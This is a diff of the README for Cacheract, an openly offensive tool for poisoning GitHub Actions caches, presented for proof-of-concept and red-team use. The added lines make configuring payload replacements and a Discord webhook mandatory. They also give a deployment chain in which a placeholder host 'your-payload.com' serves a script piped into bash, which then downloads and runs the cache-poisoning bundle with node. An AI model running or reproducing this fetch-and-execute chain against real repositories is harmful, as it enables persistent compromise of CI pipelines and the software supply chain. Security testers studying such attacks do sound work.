@@ -22,9 +22,23 @@ Cacheract supports GitHub-hosted Linux ARM and x64 runners. Due to configuration
 ## Quick Start
 
 1. Clone the Cacheract repository: `git clone https://github.com/adnaneKhan/cacheract`
-2. Update `src/config.ts` and configure the `REPLACEMENTS` (URLs or Base64 encoded files), along with the `DISCORD_WEBHOOK`. You can set custom cache keys and versions here as well.
+2. **MANDATORY** Update `src/config.ts` and configure the `REPLACEMENTS` (URLs or Base64 encoded files), along with the `DISCORD_WEBHOOK`. You can set custom cache keys and versions here as well.
+
+The default file contains example replacements (the Gato-X README and a hacked.txt file). You will want to remove them as part of any PoC or Red Team scenario.
+
 3. Run `npm build` to build Cacheract. It will be in `dist/bundle.js`.
 4. Leverage any privileged code execution within a repository by running `node bundle.js`. Currently, Cacheract DOES NOT support piping the file into `node` due to the self-insertation mechanism. You must save it to disk otherwise it will not be able to poison future caches with itself.
+
+Below is an example deployment setup:
+
+1. Initial deployment: `curl -sSfL https://your-payload.com/code.sh | bash`
+
+* `code.sh` contains:
+
+`curl -sSfL https://your-payload.com/cacheract.js > /tmp/cacheract.js && node /tmp/cacheract.js`
+
+2. The `https://your-payload.com/cacheract.js` file contains the packed `bundle.js` produced after running `npm run build` with the Cacheract repository.
+
 
 ## What Does Cacheract Do?
 
